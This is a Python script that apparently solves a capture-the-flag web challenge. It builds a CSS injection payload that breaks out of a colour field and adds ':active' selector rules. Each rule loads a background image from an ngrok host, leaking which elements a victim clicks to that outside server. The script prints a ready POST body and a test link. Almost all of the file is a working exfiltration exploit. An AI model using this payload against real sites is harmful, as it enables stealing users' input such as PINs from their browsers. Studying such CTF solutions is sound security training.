#!/usr/bin/env python3
import sys
from requests.utils import requote_uri

url = "http://webp.bcactf.com:49153/"

payload = """
.e :nth-child(1):active{background:url(https://7a795cc29696.ngrok.io/0);}
.e :nth-child(2):active{background:url(https://7a795cc29696.ngrok.io/1);}
.e :nth-child(3):active{background:url(https://7a795cc29696.ngrok.io/2);}
.e :nth-child(4):active{background:url(https://7a795cc29696.ngrok.io/3);}
.e :nth-child(5):active{background:url(https://7a795cc29696.ngrok.io/4);}
.e :nth-child(6):active{background:url(https://7a795cc29696.ngrok.io/5);}
.e :nth-child(7):active{background:url(https://7a795cc29696.ngrok.io/6);}
.e :nth-child(8):active{background:url(https://7a795cc29696.ngrok.io/7);}
.e :nth-child(9):active{background:url(https://7a795cc29696.ngrok.io/8);}
.e :nth-child(10):active{background:url(https://7a795cc29696.ngrok.io/9);}
.e :nth-child(11):active{background:url(https://7a795cc29696.ngrok.io/A);}
.e :nth-child(12):active{background:url(https://7a795cc29696.ngrok.io/B);}
.e :nth-child(13):active{background:url(https://7a795cc29696.ngrok.io/C);}
.e :nth-child(14):active{background:url(https://7a795cc29696.ngrok.io/D);}
.e :nth-child(15):active{background:url(https://7a795cc29696.ngrok.io/E);}
.e :nth-child(16):active{background:url(https://7a795cc29696.ngrok.io/F);}
""".replace('\n', '')

print("Post /submit payload")
post_payload = "bg="+requote_uri(";}"+payload)+"&fg=%23000000&bbg=%23000000&bfg=%23000000"
print(post_payload)
if len(post_payload) > 2000:
    print("error: too long!")
    sys.exit(1)

print("="*32)
injection_str = '{"bg":";}'+payload+'","fg":"","bfg":"","bbg":""}'
uri = url+"#"+injection_str
print("Local Testing Link")
print(requote_uri(uri))
